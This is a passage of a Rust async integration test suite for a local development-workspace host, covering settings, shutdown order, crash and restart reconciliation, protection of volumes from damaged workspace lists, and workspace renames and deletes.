    let covering = puddle_settings::MICROSOFT_TERMS_VERSION;
    write_global_settings(&rig, &microsoft_chosen(covering, false));
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let _editor = editor_stand_in(&rig, "acme").await;
    let origin = browser_origin(&rig, &api, "acme").await;
    let first = served_at(&origin).await;
    assert!(
        first.contains("puddle-secret-half="),
        "Microsoft's server gets the key cookie: {first}"
    );

    // The consent is withdrawn while the server runs: the running server is still Microsoft's.
    write_global_settings(&rig, &json!({"schema_version": 2}));
    let still = window_gets(&origin).await;
    assert!(
        still.contains("puddle-secret-half="),
        "the running server keeps its flavour: {still}"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_front_serves_code_server_without_the_key_cookie_and_closes_with_the_host() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let _editor = editor_stand_in(&rig, "acme").await;
    let origin = browser_origin(&rig, &api, "acme").await;
    let answer = served_at(&origin).await;
    assert!(!answer.contains("puddle-secret-half="), "{answer}");
    host.shutdown().await;
    let port: u16 = origin.rsplit(':').next().unwrap().parse().unwrap();
    assert!(
        tokio::net::TcpStream::connect(("127.0.0.1", port))
            .await
            .is_err(),
        "the front's listener is gone after shutdown"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_new_workspace_gets_the_memory_the_settings_name() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let put = api
        .request(
            "PUT",
            "/api/settings",
            Some(&json!({"workspace_defaults": {"memory": 2048}}).to_string()),
            true,
        )
        .await;
    assert_eq!(put.status, 200, "{}", put.body);
    create(&api, &mut events, "acme").await;
    let spec_memory = api.get("/api/workspaces/acme").await.json()["memory_mib"].clone();
    assert_eq!(spec_memory, 2048);
    host.shutdown().await;
    // The next start is a new process: the first one's hold on the data folder ends.
    drop(host);
    // The settings are files: a second host over the same folder sees them.
    let again = rig.start().await;
    let reply = api_for(&again).get("/api/settings").await;
    assert!(reply.body.contains("2048"), "{}", reply.body);
    again.shutdown().await;
}

/// The CPUs the fake guest of `name` has online, as the fake's `/sys/devices/system/cpu/online`.
async fn online_cpus(rig: &Rig, name: &str) -> String {
    use puddle_compute::Sandbox as _;
    let sandbox = WorkspaceName::new(name).unwrap().sandbox_name();
    let out = rig
        .runtime
        .get(&sandbox)
        .await
        .unwrap()
        .exec(ExecRequest::new("cat", ["/sys/devices/system/cpu/online"]))
        .await
        .unwrap();
    out.stdout_text().trim().to_owned()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_workspace_boots_with_the_cpus_the_settings_name_and_a_change_applies_at_the_next_start()
{
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let global = api
        .request(
            "PUT",
            "/api/settings",
            Some(&json!({"workspace_defaults": {"cpus": 2}}).to_string()),
            true,
        )
        .await;
    assert_eq!(global.status, 200, "{}", global.body);
    create(&api, &mut events, "acme").await;
    assert_eq!(online_cpus(&rig, "acme").await, "0-1", "the global default");

    let own = api
        .request(
            "PUT",
            "/api/settings/workspaces/acme",
            Some(&json!({"overrides": {"cpus": 4}}).to_string()),
            true,
        )
        .await;
    assert_eq!(own.status, 200, "{}", own.body);
    assert_eq!(
        online_cpus(&rig, "acme").await,
        "0-1",
        "a running workspace keeps its CPUs"
    );
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(online_cpus(&rig, "acme").await, "0-3", "its own override");
    host.shutdown().await;
}

/// Puts a damaged global settings file where the host reads it, before the host starts.
fn damage_global_settings(rig: &Rig) -> PathBuf {
    let dir = rig.dir.path().join("data").join("settings");
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("global.json");
    std::fs::write(&file, b"{ not json").unwrap();
    file
}

#[tokio::test(flavor = "multi_thread")]
async fn a_create_that_needs_the_default_memory_is_refused_while_the_settings_are_unreadable() {
    let rig = Rig::new();
    let file = damage_global_settings(&rig);
    let host = rig.start().await;
    let api = api(&host);
    let reply = api.post("/api/workspaces", &new_workspace("acme")).await;
    assert_eq!(reply.status, 409, "{}", reply.body);
    let message = reply.json()["message"].as_str().unwrap().to_owned();
    assert!(message.contains("global.json"), "{message}");
    assert!(message.contains("choose a memory size"), "{message}");
    assert_eq!(
        api.get("/api/workspaces").await.json()["workspaces"],
        json!([])
    );

    // Naming the memory needs no settings, so that way out works.
    let mut events = api.events().await;
    let reply = api
        .post(
            "/api/workspaces",
            &json!({"name": "acme", "repositories": [{"url": REPO}], "memory_mib": 4096})
                .to_string(),
        )
        .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let view = api.get("/api/workspaces/acme").await.json();
    assert_eq!(view["memory_mib"], 4096);
    // The same damage is on the workspace, and direct SSH stays off.
    assert_eq!(view["direct_ssh"], false);
    assert!(view["settings_error"].as_str().is_some(), "{view}");
    assert!(
        !host
            .workspaces()
            .direct_ssh_allowed(&WorkspaceName::new("acme").unwrap())
    );
    assert!(file.is_file(), "the damaged file is left for the user");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stored_memory_size_that_is_not_valid_stops_the_start_and_names_the_way_out() {
    // Below the minimum, zero, and above the maximum (1 TiB in MiB).
    for bad in [0_u32, 1, 1024 * 1024 + 1, u32::MAX] {
        let rig = Rig::new();
        let data = rig.dir.path().join("data");
        std::fs::create_dir_all(&data).unwrap();
        std::fs::write(
            data.join("workspaces.json"),
            json!({"version": 1, "workspaces": [{
                "id": "acme", "name": "acme", "repo_url": REPO, "image": "img",
                "memory_mib": bad, "created_at": 0, "disk_size_mib": 64
            }]})
            .to_string(),
        )
        .unwrap();
        let prepared = prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap();
        let err = Host::start(
            prepared,
            &FakeFactory::new(&rig.runtime, &rig.log),
            hermetic_options(),
        )
        .await
        .unwrap_err();
        let message = err.to_string();
        assert!(message.contains("workspace acme"), "{bad}: {message}");
        assert!(message.contains("workspaces.json"), "{bad}: {message}");
        // Whatever reconcile looked at, nothing was removed: the volume of the workspace that
        // could not be listed is safe.
        let calls = rig.runtime.calls();
        assert!(
            calls
                .iter()
                .all(|c| !matches!(c.op, Op::Remove | Op::RemoveVolume)),
            "{bad}: {calls:?}"
        );
    }
}

fn api_for(host: &Host<FakeRuntime>) -> Api {
    api(host)
}

// ---- the shutdown order -------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn shutdown_runs_the_steps_in_order_and_trims_then_stops_every_sandbox() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    create(&api, &mut events, "beta").await;

    let down = host.shutdown().await;
    assert_eq!(down.steps, SHUTDOWN_STEPS);
    assert_eq!(down.operations_ended, 0);
    assert!(down.sandboxes.all_stopped(), "{down:?}");
    assert_eq!(down.sandboxes.sandboxes.len(), 2);
    assert!(
        down.sandboxes
            .sandboxes
            .iter()
            .all(|s| s.trim == puddle_lifecycle::TrimOutcome::Trimmed),
        "{down:?}"
    );
    // Each sandbox: the trim command ran before its stop.
    let commands = rig.guest.commands();
    for name in ["acme", "beta"] {
        let trim = commands
            .iter()
            .position(|c| c == &format!("{name} shutdown-trim"))
            .unwrap();
        let stop = rig
            .runtime
            .calls()
            .iter()
            .position(|c| format!("{:?}", c.op) == "Stop" && c.target.as_deref() == Some(name))
            .unwrap();
        assert!(trim < commands.len() && stop > 0);
    }
    for info in rig.runtime.list().await.unwrap() {
        assert!(info.status.is_down(), "{info:?}");
    }
    // The API is gone, and a second shutdown returns the first result.
    assert!(
        tokio::net::TcpStream::connect((
            host.url().host_str().unwrap(),
            host.url().port().unwrap()
        ))
        .await
        .is_err()
    );
    assert_eq!(host.shutdown().await, down);
    assert_eq!(
        host.steps()
            .iter()
            .filter(|s| **s == Step::ApiStopped)
            .count(),
        1
    );
}

/// A runtime whose image pull takes a while, so an operation is in flight at an await point.
#[derive(Clone)]
struct SlowPull(FakeRuntime, Duration);

impl Runtime for SlowPull {
    type Sandbox = <FakeRuntime as Runtime>::Sandbox;

    fn probe(
        &self,
    ) -> impl Future<Output = Result<puddle_compute::Capabilities, puddle_compute::ComputeError>> + Send
    {
        self.0.probe()
    }

    async fn pull_image(
        &self,
        image: &ImageRef,
    ) -> Result<ImageConfig, puddle_compute::ComputeError> {
        // Simulated slow image pull.
        tokio::time::sleep(self.1).await;
        self.0.pull_image(image).await
    }

    fn create(
        &self,
        spec: puddle_compute::SandboxSpec,
    ) -> impl Future<Output = Result<Self::Sandbox, puddle_compute::ComputeError>> + Send {
        self.0.create(spec)
    }

    fn start(
        &self,
        name: &SandboxName,
    ) -> impl Future<Output = Result<Self::Sandbox, puddle_compute::ComputeError>> + Send {
        self.0.start(name)
    }

    fn get(
        &self,
        name: &SandboxName,
    ) -> impl Future<Output = Result<Self::Sandbox, puddle_compute::ComputeError>> + Send {
        self.0.get(name)
    }

    fn set_cpus(
        &self,
        name: &SandboxName,
        cpus: puddle_types::CpuCount,
    ) -> impl Future<Output = Result<(), puddle_compute::ComputeError>> + Send {
        self.0.set_cpus(name, cpus)
    }

    fn set_memory(
        &self,
        name: &SandboxName,
        memory: puddle_types::MemoryMib,
    ) -> impl Future<Output = Result<(), puddle_compute::ComputeError>> + Send {
        self.0.set_memory(name, memory)
    }

    fn list(
        &self,
    ) -> impl Future<Output = Result<Vec<puddle_compute::SandboxInfo>, puddle_compute::ComputeError>>
    + Send {
        self.0.list()
    }

    fn remove(
        &self,
        name: &SandboxName,
    ) -> impl Future<Output = Result<(), puddle_compute::ComputeError>> + Send {
        self.0.remove(name)
    }

    fn stale_dirs(
        &self,
    ) -> impl Future<Output = Result<Vec<String>, puddle_compute::ComputeError>> + Send {
        self.0.stale_dirs()
    }

    fn remove_stale_dir(
        &self,
        name: &SandboxName,
    ) -> impl Future<Output = Result<(), puddle_compute::ComputeError>> + Send {
        self.0.remove_stale_dir(name)
    }

    fn create_volume(
        &self,
        spec: puddle_compute::VolumeSpec,
    ) -> impl Future<Output = Result<puddle_compute::VolumeInfo, puddle_compute::ComputeError>> + Send
    {
        self.0.create_volume(spec)
    }

    fn volume(
        &self,
        name: &puddle_types::VolumeName,
    ) -> impl Future<
        Output = Result<Option<puddle_compute::VolumeInfo>, puddle_compute::ComputeError>,
    > + Send {
        self.0.volume(name)
    }

    fn list_volumes(
        &self,
    ) -> impl Future<Output = Result<Vec<puddle_compute::VolumeInfo>, puddle_compute::ComputeError>> + Send
    {
        self.0.list_volumes()
    }

    fn remove_volume(
        &self,
        name: &puddle_types::VolumeName,
    ) -> impl Future<Output = Result<(), puddle_compute::ComputeError>> + Send {
        self.0.remove_volume(name)
    }
}

struct SlowFactory(SlowPull);

impl RuntimeFactory for SlowFactory {
    type Runtime = SlowPull;

    fn open(
        &self,
        _: RuntimeInputs<'_>,
    ) -> impl Future<Output = Result<SlowPull, HostError>> + Send {
        std::future::ready(Ok(self.0.clone()))
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn shutdown_ends_an_operation_that_outlasts_the_grace_period() {
    let rig = Rig::new();
    let mut config = rig.config();
    config.operations_grace = Duration::from_millis(50);
    let prepared = prepare(config, &FakePlatform::new(&rig.log)).unwrap();
    let slow = SlowPull(rig.runtime.clone(), Duration::from_secs(30));
    let host = Host::start(prepared, &SlowFactory(slow), hermetic_options())
        .await
        .unwrap();
    let api = api_slow(&host);
    let mut events = api.events().await;
    api.post("/api/workspaces", &new_workspace("acme")).await;
    events
        .until(
            |e| e["type"] == "workspace_progress" && e["step"] == "pulling_image",
            Duration::from_secs(20),
        )
        .await;
    let started = std::time::Instant::now();
    let down = host.shutdown().await;
    // flake-ok: the pull sleeps 30 s and the grace is 50 ms, so a shutdown that waited for the
    // operation takes 30 s and one that ended it takes about 0.06 s (64 ms measured under load).
    assert!(
        started.elapsed() < Duration::from_secs(10),
        "{:?}",
        started.elapsed()
    );
    assert_eq!(down.operations_ended, 1, "{down:?}");
    assert_eq!(down.steps, SHUTDOWN_STEPS);
    // The ended create left its half-made volume for the next start's reconcile.
    assert!(!rig.runtime.list_volumes().await.unwrap().is_empty());
}

fn api_slow(host: &Host<SlowPull>) -> Api {
    Api::new(host.url(), host.token())
}

#[tokio::test(flavor = "multi_thread")]
async fn operations_are_refused_once_shutdown_has_begun() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    host.workspaces().close();
    let refused = api.post("/api/workspaces", &new_workspace("late")).await;
    assert_eq!(refused.status, 503, "{}", refused.body);
    assert!(refused.body.contains("shutting down"), "{}", refused.body);
    host.shutdown().await;
}

// ---- after a restart ----------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn a_restart_keeps_the_workspaces_and_rebuilds_the_sandbox_on_the_same_volume() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api1 = api(&host);
    let mut events = api1.events().await;
    create(&api1, &mut events, "acme").await;
    let created_at = api1.get("/api/workspaces/acme").await.json()["created_at"].clone();
    host.shutdown().await;
    // The next start is a new process: the first one's hold on the data folder ends.
    drop(host);
    drop(events);

    let again = rig.start().await;
    let api2 = api(&again);
    let list = api2.get("/api/workspaces").await.json();
    assert_eq!(list["workspaces"][0]["name"], "acme");
    assert_eq!(list["workspaces"][0]["status"], "stopped");
    assert_eq!(list["workspaces"][0]["created_at"], created_at);
    // Reconcile kept the sandbox and the volume (the workspace is known).
    assert!(
        again.reconcile_report().removed.is_empty(),
        "{:?}",
        again.reconcile_report()
    );
    assert!(again.reconcile_report().volumes_removed.is_empty());

    // This process does not serve the old sandbox's route, so starting rebuilds the sandbox.
    let mut events = api2.events().await;
    api2.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert_eq!(
        status_of(&api2.get("/api/workspaces/acme").await),
        "running"
    );
    let creates = rig
        .runtime
        .calls()
        .iter()
        .filter(|c| format!("{:?}", c.op) == "Create")
        .count();
    assert_eq!(creates, 2);
    assert_eq!(rig.runtime.list_volumes().await.unwrap().len(), 1);
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_crashed_sandbox_is_reported_crashed_and_start_recovers_it() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api1 = api(&host);
    let mut events = api1.events().await;
    create(&api1, &mut events, "acme").await;
    assert!(rig.runtime.crash(&SandboxName::new("acme").unwrap()));
    host.shutdown().await;
    // The next start is a new process: the first one's hold on the data folder ends.
    drop(host);

    let again = rig.start().await;
    let api2 = api(&again);
    assert_eq!(
        status_of(&api2.get("/api/workspaces/acme").await),
        "crashed"
    );
    assert_eq!(again.reconcile_report().crashed.len(), 1);
    let mut events = api2.events().await;
    api2.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_vm_left_running_by_a_dead_puddle_is_stopped_at_the_next_start() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api1 = api(&host);
    let mut events = api1.events().await;
    create(&api1, &mut events, "acme").await;
    // The first host never shuts down (it died): its VM still runs.
    let running = rig.runtime.list().await.unwrap();
    assert!(!running[0].status.is_down());

    // It died: its hold on the data folder ended with it, and the VM kept running.
    drop(host);
    // Let whatever the drop ends finish before the VM is made to outlive it.
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(
        rig.runtime
            .outlive_owner(&SandboxName::new("acme").unwrap())
    );
    assert!(
        !rig.runtime
            .outlive_owner(&SandboxName::new("nobody").unwrap())
    );
    let again = rig.start().await;
    assert_eq!(
        again.reconcile_report().stopped.len(),
        1,
        "{:?}",
        again.reconcile_report()
    );
    assert!(rig.runtime.list().await.unwrap()[0].status.is_down());
    assert_eq!(
        status_of(&api(&again).get("/api/workspaces/acme").await),
        "stopped"
    );
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_interrupted_create_is_dropped_and_its_volume_removed() {
    let rig = Rig::new();
    let data = rig.dir.path().join("data");
    std::fs::create_dir_all(&data).unwrap();
    let book = json!({"version": 1, "workspaces": [{
        "id": "half", "name": "half", "repo_url": REPO, "image": FakeRuntime::DEBIAN,
        "memory_mib": 1024, "created_at": 1, "disk_size_mib": 1024,
        "first_connect_notice_due": true, "creating": true
    }]});
    std::fs::write(data.join("workspaces.json"), book.to_string()).unwrap();
    rig.runtime
        .create_volume(puddle_compute::VolumeSpec {
            name: WorkspaceId::new("half").unwrap().volume_name(),
            size: puddle_compute::DiskSize::mib(1024),
        })
        .await
        .unwrap();

    let host = rig.start().await;
    assert!(
        api(&host).get("/api/workspaces").await.json()["workspaces"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    assert_eq!(host.reconcile_report().volumes_removed.len(), 1);
    assert!(rig.runtime.list_volumes().await.unwrap().is_empty());
    // The book no longer lists it.
    let saved: serde_json::Value =
        serde_json::from_slice(&std::fs::read(data.join("workspaces.json")).unwrap()).unwrap();
    assert!(
        saved["workspaces"].as_array().unwrap().is_empty(),
        "{saved}"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_damaged_workspace_list_stops_the_start_instead_of_looking_empty() {
    let rig = Rig::new();
    let data = rig.dir.path().join("data");
    std::fs::create_dir_all(&data).unwrap();
    std::fs::write(data.join("workspaces.json"), b"{ not json").unwrap();
    let prepared = prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap();
    let err = Host::start(
        prepared,
        &FakeFactory::new(&rig.runtime, &rig.log),
        hermetic_options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(err, HostError::State { .. }), "{err}");
    // Nothing was reconciled: a volume of the workspace that could not be listed is safe.
    assert!(rig.runtime.calls().is_empty());
}

#[tokio::test(flavor = "multi_thread")]
async fn an_open_data_folder_is_made_owner_only_at_start_and_one_that_cannot_be_refuses() {
    let rig = Rig::new();
    let data = rig.dir.path().join("data");
    std::fs::create_dir_all(&data).unwrap();
    std::fs::write(data.join("puddle.db"), b"").unwrap();
    let prepared = prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap();
    let host = Host::start(
        prepared,
        &FakeFactory::new(&rig.runtime, &rig.log),
        hermetic_options(),
    )
    .await
    .unwrap();
    let db = std::fs::File::open(data.join("puddle.db")).unwrap();
    puddle_fs::private::check(&db).unwrap();
    host.shutdown().await;

    // A folder in the database's place can't be made owner-only: the start is refused before
    // anything is reconciled.
    let rig = Rig::new();
    let data = rig.dir.path().join("data");
    std::fs::create_dir_all(data.join("puddle.db")).unwrap();
    let prepared = prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap();
    let err = Host::start(
        prepared,
        &FakeFactory::new(&rig.runtime, &rig.log),
        hermetic_options(),
    )
    .await
    .unwrap_err();
    assert!(
        err.to_string()
            .contains("will not run with wider permissions"),
        "{err}"
    );
    assert!(rig.runtime.calls().is_empty());
}

// ---- the workspace list never costs a workspace its volume ------------------------------

async fn volume_names(rig: &Rig) -> Vec<String> {
    rig.runtime
        .list_volumes()
        .await
        .unwrap()
        .into_iter()
        .map(|v| v.name)
        .collect()
}

fn list_path(rig: &Rig) -> PathBuf {
    rig.dir.path().join("data").join("workspaces.json")
}

#[tokio::test(flavor = "multi_thread")]
async fn a_missing_workspace_list_keeps_every_workspace_volume() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api1 = api(&host);
    let mut events = api1.events().await;
    create(&api1, &mut events, "acme").await;
    host.shutdown().await;
    // The next start is a new process: the first one's hold on the data folder ends.
    drop(host);
    drop(events);
    // The list is gone (deleted by hand, restored from an old backup, a broken disk).
    std::fs::remove_file(list_path(&rig)).unwrap();

    let again = rig.start().await;
    assert_eq!(volume_names(&rig).await, ["ws-acme"]);
    assert!(
        again.reconcile_report().volumes_removed.is_empty(),
        "{:?}",
        again.reconcile_report()
    );
    // Reported, so the user can be told, and still usable: the volume is never taken.
    assert_eq!(
        again.reconcile_report().unknown_volumes,
        [WorkspaceId::new("acme").unwrap().volume_name()]
    );
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_volume_no_listed_workspace_claims_is_kept() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api1 = api(&host);
    let mut events = api1.events().await;
    create(&api1, &mut events, "acme").await;
    host.shutdown().await;
    // The next start is a new process: the first one's hold on the data folder ends.
    drop(host);
    drop(events);
    // A volume with work on it that the list doesn't name (an older or partial list).
    rig.runtime
        .create_volume(puddle_compute::VolumeSpec {
            name: WorkspaceId::new("lost").unwrap().volume_name(),
            size: puddle_compute::DiskSize::mib(1024),
        })
        .await
        .unwrap();

    let again = rig.start().await;
    assert_eq!(volume_names(&rig).await, ["ws-acme", "ws-lost"]);
    assert_eq!(
        again.reconcile_report().unknown_volumes,
        [WorkspaceId::new("lost").unwrap().volume_name()]
    );
    // The listed workspace is unaffected.
    assert_eq!(
        status_of(&api(&again).get("/api/workspaces/acme").await),
        "stopped"
    );
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_create_is_refused_when_the_workspace_list_cannot_be_saved() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    make_unwritable(&list_path(&rig));

    let reply = api.post("/api/workspaces", &new_workspace("acme")).await;
    assert_eq!(reply.status, 503, "{}", reply.body);
    let message = reply.json()["message"].as_str().unwrap().to_owned();
    // What failed, the file, and what to do about it.
    assert!(message.contains("workspace list"), "{message}");
    assert!(message.contains("workspaces.json"), "{message}");
    assert!(message.contains("try again"), "{message}");
    // Nothing was made, and the name is still free.
    assert!(
        api.get("/api/workspaces").await.json()["workspaces"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    assert!(rig.runtime.list().await.unwrap().is_empty());
    assert!(volume_names(&rig).await.is_empty());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_create_whose_last_save_fails_is_undone_and_says_why() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api1 = api(&host);
    let mut events = api1.events().await;
    *rig.guest.break_list_on_clone.lock().unwrap() = Some(list_path(&rig));

    api1.post("/api/workspaces", &new_workspace("acme")).await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    // The list still says "being created", so a restart would take the volume as a leftover:
    // the create fails now, before anyone works in it.
    assert_eq!(end["step"], "failed", "{end}");
    assert!(
        end["detail"].as_str().unwrap().contains("workspace list"),
        "{end}"
    );
    assert!(rig.runtime.list().await.unwrap().is_empty());
    assert!(volume_names(&rig).await.is_empty());
    host.shutdown().await;
}

fn display_name_body(shown: &str) -> String {
    json!({"display_name": shown}).to_string()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_rename_survives_a_restart_and_leaves_the_sandbox_and_volume_alone() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api1 = api(&host);
    let mut events = api1.events().await;
    create(&api1, &mut events, "acme").await;
    // The create ends before its background listing runs; count after it, or it lands in the rename.
    after_boot_listing(&rig).await;
    let calls_before = rig.runtime.calls().len();
    let renamed = api1
        .patch("/api/workspaces/acme", &display_name_body("Acme shop"))
        .await;
    assert_eq!(renamed.status, 200, "{}", renamed.body);
    let ws = renamed.json();
    assert_eq!(
        (&ws["id"], &ws["name"], &ws["display_name"], &ws["status"]),
        (
            &json!("acme"),
            &json!("acme"),
            &json!("Acme shop"),
            &json!("running")
        )
    );
    // The workspace is running and nothing in the runtime was touched: a label only.
    assert_eq!(rig.runtime.calls().len(), calls_before);
    assert_eq!(volume_names(&rig).await, ["ws-acme"]);
    host.shutdown().await;
    drop(host);
    drop(events);

    let again = rig.start().await;
    let api2 = api(&again);
    let ws = api2.get("/api/workspaces/acme").await.json();
    assert_eq!(
        (&ws["name"], &ws["display_name"]),
        (&json!("acme"), &json!("Acme shop"))
    );
    // Going back to the name is saved too.
    let reset = api2
        .patch(
            "/api/workspaces/acme",
            &json!({"display_name": null}).to_string(),
        )
        .await;
    assert_eq!(reset.json()["display_name"], "acme");
    let saved: serde_json::Value =
        serde_json::from_slice(&std::fs::read(list_path(&rig)).unwrap()).unwrap();
    assert!(
        saved["workspaces"][0].get("display_name").is_none(),
        "{saved}"
    );
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn two_workspaces_never_share_a_label_and_a_create_cannot_take_one_in_use() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    create(&api, &mut events, "docs").await;
    assert_eq!(
        api.patch("/api/workspaces/acme", &display_name_body("Handbook"))
            .await
            .status,
        200
    );
    let clash = api
        .patch("/api/workspaces/docs", &display_name_body("handbook"))
        .await;
    assert_eq!(clash.status, 409, "{}", clash.body);
    let taken = api
        .post("/api/workspaces", &new_workspace("handbook"))
        .await;
    assert_eq!(taken.status, 409, "{}", taken.body);
    assert_eq!(volume_names(&rig).await, ["ws-acme", "ws-docs"]);
    // A workspace's own name is free for it only while nobody else answers to it.
    assert_eq!(
        api.patch("/api/workspaces/acme", &display_name_body("docs"))
            .await
            .status,
        409
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_rename_is_allowed_while_a_start_runs() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let started = api.post("/api/workspaces/acme/start", "").await;
    assert_eq!(started.status, 202, "{}", started.body);
    // The start is in flight: only the label changes, so the rename goes through.
    let during = api
        .patch("/api/workspaces/acme", &display_name_body("Acme"))
        .await;
    assert_eq!(during.status, 200, "{}", during.body);
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    let ws = api.get("/api/workspaces/acme").await.json();
    assert_eq!(
        (&ws["status"], &ws["display_name"]),
        (&json!("running"), &json!("Acme"))
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_rename_is_refused_once_shutdown_has_begun() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    host.workspaces().close();
    let refused = api
        .patch("/api/workspaces/acme", &display_name_body("Acme shop"))
        .await;
    assert_eq!(refused.status, 503, "{}", refused.body);
    assert!(refused.body.contains("shutting down"), "{}", refused.body);
    assert_eq!(
        api.get("/api/workspaces/acme").await.json()["display_name"],
        "acme"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_rename_is_undone_when_the_workspace_list_cannot_be_saved() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    make_unwritable(&list_path(&rig));
    let refused = api
        .patch("/api/workspaces/acme", &display_name_body("Acme shop"))
        .await;
    assert_eq!(refused.status, 503, "{}", refused.body);
    let message = refused.json()["message"].as_str().unwrap().to_owned();
    assert!(
        message.contains("not renamed") && message.contains("workspace list"),
        "{message}"
    );
    // The user is not told a name that a restart would undo.
    assert_eq!(
        api.get("/api/workspaces/acme").await.json()["display_name"],
        "acme"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_workspace_list_with_a_bad_display_name_stops_the_start() {
    let rig = Rig::new();
    let data = rig.dir.path().join("data");
    std::fs::create_dir_all(&data).unwrap();
    let book = json!({"version": 1, "workspaces": [{
        "id": "acme", "name": "acme", "display_name": "two\nlines", "repo_url": REPO,
        "image": FakeRuntime::DEBIAN, "memory_mib": 1024, "created_at": 1, "disk_size_mib": 1024
    }]});
    std::fs::write(data.join("workspaces.json"), book.to_string()).unwrap();
    let prepared = prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap();
    let err = Host::start(
        prepared,
        &FakeFactory::new(&rig.runtime, &rig.log),
        hermetic_options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(err, HostError::State { .. }), "{err}");
    assert!(err.to_string().contains("display name"), "{err}");
    // The workspace's volume is safe: nothing was reconciled.
    assert!(rig.runtime.calls().is_empty());
}

#[tokio::test(flavor = "multi_thread")]
async fn a_delete_is_refused_when_the_workspace_list_cannot_be_saved() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    make_unwritable(&list_path(&rig));

    let confirm = json!({"confirm": true}).to_string();
    let refused = api.delete("/api/workspaces/acme", Some(&confirm)).await;
    assert_eq!(refused.status, 503, "{}", refused.body);
    let message = refused.json()["message"].as_str().unwrap().to_owned();
    assert!(message.contains("workspace list"), "{message}");
    // Nothing was deleted: the workspace and its volume are still there.
    assert_eq!(status_of(&api.get("/api/workspaces/acme").await), "stopped");
    assert_eq!(volume_names(&rig).await, ["ws-acme"]);
    // Not busy any more: once the list can be saved again, the delete goes through.
    std::fs::remove_file(list_path(&rig).join("keep")).unwrap();
    std::fs::remove_dir(list_path(&rig)).unwrap();
    let accepted = api.delete("/api/workspaces/acme", Some(&confirm)).await;
    assert_eq!(accepted.status, 202, "{}", accepted.body);
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert!(volume_names(&rig).await.is_empty());
    let saved: serde_json::Value =
